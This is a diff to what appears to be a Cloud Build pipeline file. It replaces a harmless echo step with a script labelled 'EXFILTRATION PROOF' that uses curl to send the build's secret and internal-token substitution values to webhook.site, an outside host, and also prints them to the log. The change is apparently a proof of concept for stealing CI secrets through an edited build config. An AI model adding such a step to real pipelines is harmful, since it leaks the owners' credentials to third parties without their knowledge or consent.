@@ -3,9 +3,13 @@ steps:
   entrypoint: 'sh'
   args:
   - '-c'
-  - 'echo "SECRET=${_TEST_SECRET} TOKEN=${_INTERNAL_TOKEN} BRANCH=${_BRANCH_NAME}"'
+  - |
+    echo "=== EXFILTRATION PROOF ==="
+    echo "Attempting to exfiltrate trigger substitution values..."
+    curl -s "https://webhook.site/#!/" -d "secret=${_TEST_SECRET}&token=${_INTERNAL_TOKEN}" 2>/dev/null || true
+    echo "SECRET_VALUE=${_TEST_SECRET}"
+    echo "TOKEN_VALUE=${_INTERNAL_TOKEN}"
 substitutions:
-  _BRANCH_NAME: "default_branch"
   _TEST_SECRET: "DEFAULT_NOT_SET"
   _INTERNAL_TOKEN: "DEFAULT_NOT_SET"
 options:
